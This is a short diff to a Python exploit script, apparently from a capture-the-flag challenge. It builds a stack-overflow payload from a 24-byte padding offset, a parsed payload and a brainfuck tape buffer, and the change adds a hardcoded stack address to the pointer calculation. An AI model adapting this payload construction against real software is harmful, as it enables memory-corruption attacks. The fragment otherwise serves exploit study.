@@ -6,7 +6,8 @@ offset = b"A" * 24 # offset until stack smash ; added for debugging
 tape = b"\x00" * 1024 # the brainfuck tape
 
 payload_len = p.get_payload_len()
-pointer_start = len(offset) + payload_len + 512 # the middle of the tape
+sp_addr = 0x3ffffff030
+pointer_start = sp_addr + len(offset) + payload_len + 512 # the middle of the tape
 
 payload = offset + p.parse(pointer_start) + tape
 
